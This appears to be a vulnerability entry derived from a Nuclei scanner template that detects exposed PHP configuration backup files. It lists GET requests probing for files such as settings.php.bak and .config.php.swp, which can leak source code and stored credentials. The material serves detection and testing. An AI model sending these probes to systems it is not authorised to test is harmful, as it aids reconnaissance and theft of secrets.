# Nuclei Template: Generic PHP Backup Information Disclosure
**Template ID:** generic-php-files
**Vulnerability Class:** Information Disclosure
**Severity:** Medium
**CWE:** CWE-200
**Source:** Nuclei Template (`generic-php-files.yaml`)

## Vulnerability Information & PoC

## Description
Generic php file source code was detected via backup files.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/settings.php.bak
GET {{BaseURL}}/settings.php.dist
GET {{BaseURL}}/settings.php.old
GET {{BaseURL}}/settings.php.save
GET {{BaseURL}}/.settings.php.swp
GET {{BaseURL}}/settings.php.txt
GET {{BaseURL}}/config/settings.old.php
GET {{BaseURL}}/config.php.bak
GET {{BaseURL}}/config.php.dist
GET {{BaseURL}}/config.php.old
GET {{BaseURL}}/config.php.save
GET {{BaseURL}}/.config.php.swp
GET {{BaseURL}}/config.php.txt
GET {{BaseURL}}/config/settings.old.php
```

